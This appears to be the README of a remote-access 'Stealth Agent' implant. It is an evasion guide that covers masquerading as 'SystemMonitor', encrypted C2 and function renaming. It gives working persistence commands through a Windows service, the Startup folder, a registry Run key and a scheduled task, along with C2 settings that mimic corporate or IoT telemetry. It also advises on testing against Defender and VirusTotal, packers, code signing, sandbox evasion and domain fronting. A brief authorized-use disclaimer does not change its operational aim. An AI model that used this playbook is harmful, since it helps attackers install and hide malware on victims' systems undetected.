# üîí Stealth Agent - Advanced Evasion Guide

## üõ°Ô∏è Anti-Detection Features Implemented

### ‚úÖ What We've Fixed:
1. **Removed Defender Exclusion Attempts** - No more obvious PowerShell commands
2. **Function Name Obfuscation** - Renamed malicious functions to legitimate names
3. **Encrypted Communications** - Replaced base64 with Fernet encryption
4. **Legitimate Cover Functionality** - Added real system monitoring features
5. **String Obfuscation** - Hidden API endpoints and suspicious strings
6. **Process Name Masking** - Now appears as "SystemMonitor"

### üéØ Stealth Techniques Used:
- **Behavioral Mimicry**: Acts like legitimate system monitoring software
- **Encrypted C2**: All communications are encrypted, not just base64
- **Legitimate Thread Names**: HeartbeatService, TaskProcessor, MaintenanceService
- **Real System Functions**: Actually performs system health checks
- **Obfuscated Strings**: No hardcoded suspicious strings

## üöÄ Compilation Instructions

### Step 1: Install Dependencies
```bash
pip install -r requirements_stealth.txt
```

### Step 2: Build Stealth Executable
```bash
python build_stealth.py
```

### Step 3: Optional - Manual PyInstaller Build
```bash
pyinstaller --onefile --noconsole --name=SystemMonitor agent.py
```

## üîß Advanced Evasion Techniques

### 1. **Process Hollowing** (Advanced)
```python
# Replace direct execution with process hollowing
# Inject into legitimate processes like svchost.exe
```

### 2. **DLL Side-Loading** (Expert)
```python
# Load as a DLL instead of EXE
# Place in system directories with legitimate names
```

### 3. **Reflective Loading** (Expert)
```python
# Load directly into memory without touching disk
# Use tools like Donut or similar
```

### 4. **Living Off The Land** (Recommended)
```python
# Use only built-in Windows tools and libraries
# Avoid suspicious imports and external dependencies
```

## üé≠ Deployment Strategies

### Strategy 1: Service Installation
```batch
# Run as Windows service
sc create "SystemMonitorSvc" binPath= "C:\Windows\System32\SystemMonitor.exe"
sc start "SystemMonitorSvc"
```

### Strategy 2: Startup Folder
```batch
# Copy to startup folder
copy SystemMonitor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Strategy 3: Registry Run Key
```batch
# Add to registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /d "C:\Path\To\SystemMonitor.exe"
```

### Strategy 4: Scheduled Task
```batch
# Create scheduled task
schtasks /create /tn "SystemMonitor" /tr "C:\Path\To\SystemMonitor.exe" /sc onlogon
```

## üõ°Ô∏è Avoiding Behavioral Detection

### Memory Signatures
- **Issue**: Direct API calls can be hooked
- **Solution**: Use indirect calls and API hashing

### Network Signatures  
- **Issue**: Regular beacons are suspicious
- **Solution**: Variable intervals, legitimate protocols

### File System Signatures
- **Issue**: Dropped files can be analyzed
- **Solution**: Fileless execution, in-memory operations

## üéØ Target-Specific Customization

### Corporate Environments
```python
# Mimic enterprise software
C2_URL = "https://monitoring.company.com/api"
agent_id = f"workstation_{computer_name}"
```

### Home Networks
```python
# Mimic IoT or smart home devices
C2_URL = "https://telemetry.smartdevice.com/data"
agent_id = f"device_{mac_address}"
```

## üîç Testing Against Detection

### 1. **Windows Defender**
```bash
# Test with Windows Defender enabled
# Check Windows Security event logs
```

### 2. **VirusTotal**
```bash
# Upload to VirusTotal (use a VPN)
# Check detection ratios
```

### 3. **Process Monitor**
```bash
# Use ProcMon to check file/registry access
# Ensure no suspicious patterns
```

### 4. **Wireshark**
```bash
# Monitor network traffic
# Verify encryption is working
```

## ‚ö†Ô∏è Legal and Ethical Considerations

**IMPORTANT**: This tool is for:
- ‚úÖ Authorized penetration testing
- ‚úÖ Red team exercises  
- ‚úÖ Security research
- ‚úÖ Educational purposes

**DO NOT USE FOR**:
- ‚ùå Unauthorized access
- ‚ùå Malicious activities
- ‚ùå Illegal purposes

## üîß Troubleshooting

### Agent Not Connecting
1. Check firewall settings
2. Verify C2 server is running
3. Test with curl/wget first

### High Detection Rate
1. Add more legitimate functionality
2. Increase obfuscation
3. Use different compilation methods
4. Consider packers like UPX or Themida

### Performance Issues
1. Reduce beacon frequency
2. Optimize module imports
3. Use threading for heavy operations

## üéØ Next Level Evasion

For maximum stealth, consider:
1. **Custom Packers**: Use commercial packers like Themida, VMProtect
2. **Code Signing**: Sign with valid certificates
3. **Sandbox Evasion**: Add VM/sandbox detection
4. **Time Delays**: Add random delays and sleep timers
5. **Domain Fronting**: Use CDN services for C2 communication

*Remember: The best evasion is not being detected in the first place. Focus on legitimacy over complexity.*
